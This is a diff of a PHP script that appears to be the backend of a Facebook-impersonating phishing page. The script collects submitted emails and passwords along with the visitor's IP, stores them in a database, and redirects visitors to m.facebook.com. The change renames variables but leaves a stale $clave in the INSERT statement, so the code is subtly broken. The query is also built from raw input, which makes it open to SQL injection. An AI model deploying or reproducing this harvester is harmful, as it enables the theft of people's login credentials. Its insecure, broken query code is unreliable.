@@ -1,11 +1,11 @@
 <?php
 error_reporting(0);
 
-$usuario = $_POST['email'];
-$clave = $_POST['pass'];
+$mail = $_POST['email'];
+$pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR'];
  
-if( (empty($usuario)) or (empty($clave)) ){
+if( (empty($mail)) or (empty($pass)) ){
      header('location: https://m.facebook.com/');
 }else{
 
@@ -19,12 +19,12 @@ if( (empty($usuario)) or (empty($clave)) ){
 
       //echo $mail. '<br>'. $pw;
 
-      $userData = "INSERT INTO user (`User`,`Pass`,`Date`,`Time`,`IP`) VALUES ('$usuario','$clave','$date','$time','$ip')";
+      $userData = "INSERT INTO user (`User`,`Pass`,`Date`,`Time`,`IP`) VALUES ('$mail','$clave','$date','$time','$ip')";
 
       echo $userData;
       if(mysqli_query($con,$userData)){
           session_start();
-          $_SESSION['user'] = $usuario;
+          $_SESSION['user'] = $mail;
           header('Location: ../');
       }else{
           header('Location: ./index.php');
